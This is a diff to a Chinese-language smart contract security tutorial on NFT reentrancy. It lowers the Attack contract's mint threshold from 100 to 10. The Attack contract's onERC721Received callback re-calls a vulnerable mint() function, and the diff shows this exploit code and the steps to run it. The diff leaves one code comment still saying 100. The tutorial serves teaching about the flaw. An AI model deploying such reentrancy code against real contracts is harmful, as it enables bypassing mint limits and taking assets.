@@ -72,7 +72,7 @@ contract NFTReentrancy is ERC721 {
 `Attack`合约继承了`IERC721Receiver`合约，它有 `1` 个状态变量`nft`记录了有漏洞的NFT合约地址。它有 `3` 个函数:
 - 构造函数: 初始化有漏洞的NFT合约地址。
 - `attack()`: 攻击函数，调用NFT合约的`mint()`函数并发起攻击。
-- `onERC721Received()`: 嵌入了恶意代码的ERC721回调函数，会重复调用`mint()`函数，并铸造100个NFT。
+- `onERC721Received()`: 嵌入了恶意代码的ERC721回调函数，会重复调用`mint()`函数，并铸造10个NFT。
 
 ```solidity
 contract Attack is IERC721Receiver{
@@ -90,7 +90,7 @@ contract Attack is IERC721Receiver{
 
     // ERC721的回调函数，会重复调用mint函数，铸造100个
     function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
-        if(nft.balanceOf(address(this)) < 100){
+        if(nft.balanceOf(address(this)) < 10){
             nft.mint();
         }
         return this.onERC721Received.selector;
@@ -103,7 +103,7 @@ contract Attack is IERC721Receiver{
 1. 部署`NFTReentrancy`合约。
 2. 部署`Attack`合约，参数填`NFTReentrancy`合约地址。
 3. 调用`Attack`合约的`attack()`函数发起攻击。
-4. 调用`NFTReentrancy`合约的`balanceOf()`函数查询`Attack`合约的持仓，可以看到持有`100`个NFT，攻击成功。
+4. 调用`NFTReentrancy`合约的`balanceOf()`函数查询`Attack`合约的持仓，可以看到持有`10`个NFT，攻击成功。
 
 ![](./img/S16-2.png)
 
